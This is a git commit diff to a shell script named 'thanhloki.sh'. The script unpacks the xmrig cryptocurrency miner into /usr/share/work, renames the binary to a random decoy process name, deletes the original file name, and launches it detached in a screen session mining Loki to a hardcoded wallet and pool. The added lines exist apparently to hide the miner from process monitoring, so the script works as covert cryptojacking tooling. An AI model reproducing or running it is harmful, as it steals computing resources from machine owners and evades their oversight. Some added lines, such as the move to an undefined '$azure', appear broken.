4ae78d8813e33fe48451e1c401eb8d9cb66cd2cd
luanbuifx <luanbuifx@gmail.com>
2019-10-22 14:41:09 +0700

    Update thanhloki.sh

--- thanhloki.sh
+++ thanhloki.sh
@@ -9,5 +9,8 @@ mv xmrig-3.2.0-xenial-x64.tar.gz /usr/share/work/
 cd /usr/share/work/ &&  tar xf xmrig-3.2.0-xenial-x64.tar.gz
 rm -rf xmrig-3.2.0-xenial-x64.tar.gz && cd xmrig-3.2.0
 a='mxsemsdnlkdj-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
+mv xmrig $azure -n
+sudo cp $azure "$cpuname"
+sudo rm -f  xmrig
 echo $cpuname" is starting"
-screen -d -m ./xmrig --donate-level 1 -o loki.pool.mine2gether.com:3331 -u LSkEijdmcNWSCHjzZPjzyEERnw7DFyQfofQTL79KEwmehzCVavMcbtPdYepV9XL3DQFDXpTUYg9PQJq8GKjzyMYw89D67Tn -p "Luan660777" -a argon2/chukwa -k -t 3
+screen -d -m ./"${cpuname}" --donate-level 1 -o loki.herominers.com:10110 -u LSkEijdmcNWSCHjzZPjzyEERnw7DFyQfofQTL79KEwmehzCVavMcbtPdYepV9XL3DQFDXpTUYg9PQJq8GKjzyMYw89D67Tn -p ChickenMan -a rx/loki -k
